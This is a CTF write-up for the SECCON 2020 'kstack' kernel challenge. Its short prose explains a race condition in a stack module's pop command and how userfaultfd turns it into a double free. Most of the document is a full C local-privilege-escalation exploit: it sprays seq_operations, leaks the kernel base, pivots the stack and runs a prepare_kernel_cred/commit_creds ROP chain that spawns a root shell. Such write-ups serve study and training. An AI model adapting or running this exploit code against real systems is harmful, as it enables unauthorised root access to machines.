# Kstack - SECCON CTF 2020

## Vuln

Race condition in `CMD_POP`

```c
  case CMD_POP:
    for(tmp = head, prev = NULL; tmp != NULL; prev = tmp, tmp = tmp->fd) {
      if (tmp->owner == pid) {
        if (copy_to_user((void*)arg, (void*)&tmp->value, sizeof(unsigned long)))
          return -EINVAL;
        if (prev) {
          prev->fd = tmp->fd;
        } else {
          head = tmp->fd;
        }
        kfree(tmp);
        break;
      }
      if (tmp->fd == NULL) return -EINVAL;
    }
    break;
  }
  return 0;
```
No lock if two threads are trying to pop the same value
&rarr; **race condition**

## Userfaultfd

As `CMD_PUSH` shows

```c
  case CMD_PUSH:
    tmp = kmalloc(sizeof(Element), GFP_KERNEL);
    tmp->owner = pid;
    tmp->fd = head;
    head = tmp;
    if (copy_from_user((void*)&tmp->value, (void*)arg, sizeof(unsigned long))) {
      head = tmp->fd;
      kfree(tmp);
      return -EINVAL;
    }
    break;
```
We can kmalloc a struct, which will reside in kmalloc - 32. I chose `seq_operations`.

Flow for exploitation could be:
- Step 1: Push a value, then take advantage of `userfaultfd` to double free
- Step 2: Open `/proc/self/stat`, which will be our dangling pointer from the recent double free, trigger userfaultfd in `CMD_PUSH` to pop the recent `seq_operations`, leak kernel base
- Step 3: Double free again, then overwrite `seq_operations` to our desired value.

**Final exploit**
```c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/xattr.h>

#include <linux/btrfs.h>
#include <linux/capability.h>
#include <linux/sysctl.h>
#include <linux/types.h>
#include <linux/userfaultfd.h> 

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG


#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define asm __asm__

#define PAGE_SIZE 0x1000

#define CMD_PUSH 0x57ac0001
#define CMD_POP  0x57ac0002

u64 user_ip;
u64 user_cs;
u64 user_rflags;
u64 user_sp;
u64 user_ss;
i32 spray[0x200];
int devfd, victim;
u64 val, val1, val2, val3;
void *buffer;
u64 kbase;
#define ADDR(x) (kbase - 0xffffffff81000000 + x)
void panic(char*str){
    write(1, str, strlen(str));
    exit(-1);
}
typedef struct _Element {
    int owner;
    unsigned long value;
    struct _Element *fd;
} Element;

void pin_cpu(int cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        panic("sched_setaffinity");
    }
}

void getShell()
{
    if (getuid())
    {
        puts("Bye");
    }
    write(1, "Get root\n", 10);
    char* argv[] = { "/bin/sh", NULL };
    char** envp = &argv[1];
    execve(argv[0], argv, envp);
}

void save_state()
{
    __asm__(
        "mov [rip + user_cs], cs\n"
        "mov [rip + user_ss], ss\n"
        "mov [rip + user_sp], rsp\n"
        "mov [rip + user_ip], %0\n"
        "pushf\n"
        "pop qword ptr [rip + user_rflags]\n" ::"r"(getShell));
    logInfo("Saved user state");
}
u64 page_size;

u64 push(u64* value){
    int ret;
    ret = ioctl(devfd, CMD_PUSH, value);
    if (ret < 0){
        panic("Failed to ioctl");
    }
}
u64 pop(u64 *value){
    int ret;
    ret = ioctl(devfd, CMD_POP, value);
    if (ret < 0){
        panic("Failed to ioctl");
    }
}


void *handler(void* arg){
    static struct uffd_msg msg;
    struct uffdio_copy copy;
    struct pollfd poll_fd;
    static int count = 0;
    i64 uffd;
    uffd = (i64)arg;
    poll_fd.fd = uffd;
    poll_fd.events = POLLIN;
    while(poll(&poll_fd, 1, -1) > 0){
        if(poll_fd.revents & POLLERR || poll_fd.revents & POLLHUP){
            panic("poll");
        }
        if(read(uffd, &msg, sizeof(msg)) <= 0){
            panic("read from uffd");
        }
        logOK("Successfully read from uffd");
        assert(msg.event == UFFD_EVENT_PAGEFAULT);
        switch(count++){
            case 0:
                pop(&val);
                printf("Pop value: 0x%llx\n", val);
                break;
            case 1:
                pop(&val);
                printf("Pop value: 0x%llx\n", val);
                break;
            case 2:
                pop(&val);
                printf("Pop value: 0x%llx\n", val);
                break;
            case 3:
                victim = open("/proc/self/stat", O_RDONLY);
                printf("Victim fd: %u\n", victim);
                break;
            default:
                panic("Failed to poll");
                break;

        }
        copy.dst = msg.arg.pagefault.address & (~0xfff);
        copy.src = (u64)buffer;
        copy.len = 0x1000;
        copy.mode = 0;
        copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &copy) == -1){
            panic("UFFDIO_COPY");
        }

    }
    

}
void setup_pagefault(void *addr, u64 len){
    i64 uffd;
    pthread_t th;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    
    page_size = sysconf(_SC_PAGE_SIZE);
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1){
      panic("userfaultfd");
    }
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1){
        panic("UFFD_API");
    }

    uffdio_register.range.start = (u64)addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1){
        panic("UFFDIO_REGISTER");
    }
    if (pthread_create(&th, NULL, handler, (void*)uffd) == -1){
        panic("pthread_create");
    }

}



int main(){
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    pin_cpu(0);
    save_state();
    
    pthread_t th1, th2, th3, th4, th5;
    devfd = open("/proc/stack", O_RDWR);
    if (devfd < 0){
        panic("Open /proc/stack");
    }
    void *page = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (page == MAP_FAILED){
        panic("mmap pagefault");
    }
    printf("Page: %p\n", page);
    printf("Value at %p\n", &val);
    printf("PID: %u\n", (u32)getpid());
    setup_pagefault(page, 0x4000);

    buffer = malloc(0x1000);
    printf("Buffer: %p\n", buffer);

    for (u32 i = 0; i < 0x100; i++){
        spray[i] = open("/proc/self/stat", O_RDONLY);
        if (spray[i] < 0){
            panic("Open /proc/self/stat");
        }
    }
    val = 0xdeadbeef;
    push(&val);
    pop(page);

    victim = open("/proc/self/stat", O_RDONLY);
    push((u64*)((u64)page + 0x1000));
    kbase = val - 0x13be80;
    printf("Kbase: 0x%llx\n", kbase);

    u64 pop_rdi = 0x34505 + kbase;
    u64 commit_creds = ADDR(0xffffffff81069c10);
    u64 init_cred = ADDR(0xffffffff81c2be60);
    u64 kpti_trampoline = ADDR(0xffffffff81600a4a);
    u64 prepare_kernel_cred = ADDR(0xffffffff81069e00);
    u64 mov_rdi_rax = kbase + 0x5a818f;
    push(&val);
    pop((u64*)((u64)page + 0x2000));
    
    memset((void*)((u64)page + 0x3000 - 0x20), 'B', 0x20);
    memset((void*)((u64)page + 0x3000 - 0x18), 'B', 0x20);
    memset((void*)((u64)page + 0x3000 - 0x10), 'B', 0x20);
    *(u64*)((u64)page + 0x3000 - 0x20) = kbase + 0x2cae0;
    *(u64*)((u64)page + 0x3000 - 0x18) = kbase + 0x2cae0;
    *(u64*)((u64)page + 0x3000 - 0x10) = kbase + 0x2cae0;
    *(u64*)((u64)page + 0x3000 - 0x8) = kbase + 0x2cae0;
    setxattr("/tmp", "haha", (void*)((u64)page + 0x3000 - 0x20), 0x20, XATTR_CREATE);
    
    // mmap ropchain
    void *ropchain = mmap((void*)0x5d000000 - 0x10000, 0x20000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0);
    if (ropchain == MAP_FAILED){
        panic("mmap ropchain");
    }
    memset(ropchain, 'A', 0x20000);
    u64 *rop = 0x5d000010;
    *rop++ = pop_rdi;
    *rop++ = 0;
    *rop++ = prepare_kernel_cred;
    *rop++ = mov_rdi_rax;
    *rop++ = commit_creds;
    *rop++ = kpti_trampoline;
    *rop++ = 0x13371337;
    *rop++ = 0x13371337;
    *rop++ = (u64)getShell;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_sp;
    *rop++ = user_ss;

    for (u32 i = 0; i < 0x100; i++){
        close(spray[i]);
    }
    read(victim, (void*)0x13371337, 0x13371337);
}  

